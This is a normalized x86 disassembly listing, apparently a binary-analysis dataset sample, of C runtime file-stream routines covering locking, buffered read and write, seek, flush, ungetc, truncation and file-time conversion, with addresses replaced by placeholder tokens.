xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] ebx
setne al
cmp eax ebx
je r-xdata
call sub_412089
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] esi
push esi
call sub_40e58e
pop ecx
mov [ ebp - 0x4 ] ebx
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_412385
retn
cmp [ ebp - 0x1c ] ebx
jne r-xdata
push esi
call sub_40ebab
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e4ad
mov eax [ ebp - 0x1c ]
push esi
call sub_412a19
mov edi eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
push esi
call sub_412b7f
mov [ ebp - 0x1c ] eax
push esi
push edi
call sub_412aaf
add esp 0x1c
mov eax rw-data
push esi
call sub_40ebab
pop ecx
cmp eax 0xfffffffe
je r-xdata
call sub_412089
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
push esi
call sub_40ebab
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_40ebab
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
push esi
call sub_40ebab
pop ecx
pop ecx
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
jmp r-xdata
mov eax rw-data
push esi
call sub_40ebab
pop ecx
cmp eax 0xfffffffe
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
push esi
call sub_40ebab
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
push esi
call sub_40ebab
pop ecx
pop ecx
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_40e4bd
mov eax [ rw-data ]
test eax eax
push esi
push 0x14
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_413797
test eax eax
pop ecx
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_413797
test eax eax
pop ecx
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov edi edx
and edi 0x1f
imul edi edi 0x28
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_40e58e
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_411ef3
pop ecx
retn
sub_40e5bd
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x10
push eax
call sub_411ef3
pop ecx
retn
sub_40e5e0
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_411e1b
pop ecx
retn
sub_40e60f
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x10
push eax
call sub_411e1b
pop ecx
retn
sub_40e64d
push 0xc
push r--data
call sub_412340
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
jne r-xdata
push esi
call sub_40e58e
pop ecx
mov [ ebp - 0x4 ] ebx
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_412089
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
push esi
call sub_40ebab
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_412385
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e784
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov eax rw-data
push esi
call sub_40ebab
pop ecx
cmp eax 0xfffffffe
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_4139ac
pop ecx
pop ecx
mov ecx [ esi ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
movzx eax al
inc [ esi ]
jmp r-xdata
call sub_412089
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
push esi
call sub_40ebab
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_40ebab
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
push esi
call sub_40ebab
pop ecx
pop ecx
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
push esi
call sub_40ebab
pop ecx
cmp eax 0xfffffffe
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
push esi
call sub_40ebab
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
push esi
call sub_40ebab
pop ecx
pop ecx
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_40e78c
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
imul edi [ ebp + 0x14 ]
mov esi [ ebp + 0x18 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_413b0c
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax ebx
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp eax [ ebp - 0x4 ]
ja r-xdata
xor edx edx
div [ ebp - 0xc ]
mov eax ebx
sub eax edx
or [ esi + 0xc ] 0x20
cmp ebx eax
mov edi ebx
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push eax
push [ ebp - 0x8 ]
push esi
call sub_40ebab
pop ecx
push eax
call sub_4141ce
add esp 0xc
test eax eax
je r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_412089
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_40fb30
add esp 0xc
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_4142aa
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_41202a
add esp 0x14
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
call sub_412089
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_40fb30
add esp 0xc
test ebx ebx
jne r-xdata
sub_40e922
push 0xc
push r--data
call sub_412340
xor esi esi
mov [ ebp - 0x1c ] esi
mov ebx [ ebp + 0x10 ]
cmp ebx esi
je r-xdata
xor eax eax
mov edi [ ebp + 0x14 ]
cmp edi esi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
cmp [ ebp + 0x18 ] esi
je r-xdata
call sub_412089
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41202a
add esp 0x14
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div ebx
cmp edi eax
jbe r-xdata
xor eax eax
cmp [ ebp + 0x18 ] esi
setne al
cmp eax esi
je r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_40fb30
add esp 0xc
push [ ebp + 0x18 ]
call sub_40e58e
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push edi
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e78c
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e9df
mov eax [ ebp - 0x1c ]
jmp r-xdata
or eax 0xffffffff
xor edx edx
div ebx
cmp eax edi
sbb eax eax
inc eax
je r-xdata
call sub_412385
retn
sub_40ea04
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
test eax eax
push ebx
mov [ ebp - 0x8 ] eax
mov ebx eax
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
mov [ ebp - 0x4 ] 0x1000
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
push edi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jb r-xdata
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
movsx eax [ eax ]
push esi
push eax
call sub_4139ac
cmp eax 0xffffffff
pop ecx
pop ecx
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax [ ebp - 0x8 ]
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
test eax eax
mov [ ebp - 0x4 ] eax
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_40f31d
test eax eax
pop ecx
jne r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx edi
jae r-xdata
pop edi
pop esi
test ebx ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
push edi
push [ ebp + 0x8 ]
push esi
call sub_40ebab
pop ecx
push eax
call sub_4148eb
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x4 ]
sub edi edx
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_410ec0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
cmp eax edi
mov ecx edi
ja r-xdata
add [ ebp + 0x8 ] ecx
sub ebx ecx
cmp eax edi
jae r-xdata
mov ecx eax
sub_40eb1e
push 0xc
push r--data
call sub_412340
mov eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
xor eax eax
xor esi esi
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_412089
mov [ eax ] esi
push esi
push esi
push esi
push esi
push esi
call sub_41202a
add esp 0x14
jmp r-xdata
call sub_412385
retn
push [ ebp + 0x14 ]
call sub_40e58e
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ea04
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40eba1
mov eax [ ebp - 0x1c ]
sub_40ebab
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
pop esi
retn
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
pop esi
retn
sub_40ebd8
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_40ebab
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
push 0x1
push ebx
push eax
call sub_4150d6
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test dx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
test dl 0x3
mov [ ebp - 0xc ] esi
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov esi [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
and esi 0x1f
imul esi esi 0x28
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_412089
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov esi [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
and esi 0x1f
imul esi esi 0x28
sub eax ecx
add eax edx
sar ebx 0x5
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_4150d6
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_4150d6
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test cx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_40ed70
push 0xc
push r--data
call sub_412340
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_40e58e
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_40ebd8
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40edd4
mov eax [ ebp - 0x1c ]
call sub_412089
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_412385
retn
sub_40edde
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_412089
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_40f31d
mov eax [ esi + 0xc ]
test al al
pop ecx
jns r-xdata
push esi
call sub_40ebd8
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40ebab
pop ecx
push eax
call sub_4150d6
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test ax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_40ee65
push 0xc
push r--data
call sub_412340
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_412089
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40e58e
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40edde
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40eee0
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_412385
retn
cmp edi 0x2
jne r-xdata
sub_40eeea
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
or ebp 0xffffffff
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
mov ebx [ esp + 0x14 ]
cmp ebx ebp
je r-xdata
push esi
call sub_40ebab
cmp eax ebp
pop ecx
mov ebx rw-data
je r-xdata
mov eax ebp
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov eax ebx
push esi
call sub_40ebab
cmp eax 0xfffffffe
pop ecx
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_412089
xor edi edi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
push esi
call sub_40ebab
cmp eax ebp
pop ecx
je r-xdata
push esi
call sub_40ebab
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_40ebab
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
pop ecx
pop ecx
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_4151b2
pop ecx
test al 0x2
jne r-xdata
mov eax ebx
push esi
call sub_40ebab
cmp eax 0xfffffffe
pop ecx
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
push esi
call sub_40ebab
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_40ebab
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
pop ecx
pop ecx
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_40f008
push 0xc
push r--data
call sub_412340
xor eax eax
xor esi esi
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40e58e
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40eeea
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f070
mov eax [ ebp - 0x1c ]
call sub_412089
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_412385
retn
sub_40f07a
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_412089
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_40f31d
push esi
mov ebx eax
call sub_415357
push esi
call sub_40ebab
push eax
call sub_41528a
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_40fdab
pop ecx
mov [ esi + 0x1c ] edi
sub_40f0ed
push 0xc
push r--data
call sub_412340
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_412089
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_40e58e
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_40f07a
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f161
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_412385
retn
mov eax [ ebp - 0x1c ]
sub_40f169
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_415383
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
cmp eax 0xffffffff
mov [ ebp - 0x14 ] edx
je r-xdata
call sub_412089
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_415383
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_415383
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
mov [ ebp - 0x4 ] eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415383
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_411412
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_412089
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_414ac5
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
cmp eax 0xffffffff
mov [ ebp - 0xc ] edx
jne r-xdata
mov eax esi
jg r-xdata
call sub_412089
mov [ eax ] 0xd
call sub_41209c
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_41209c
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_412089
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_414325
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_411412
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_40f31d
push ebx
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_40ebab
pop ecx
push eax
call sub_4148eb
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40f37f
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40f31d
test eax eax
pop ecx
je r-xdata
push esi
call sub_40f3c1
pop ecx
pop esi
retn
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push esi
call sub_40ebab
push eax
call sub_41551f
pop ecx
pop ecx
neg eax
sbb eax eax
pop esi
retn
sub_40f3c1
push 0x14
push r--data
call sub_412340
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f492
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_412385
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_40e5bd
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_40f463
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_40f37f
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_40f37f
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_40f4c4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x18
cmp [ eax ] 0x0
jne r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax edx
leave
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
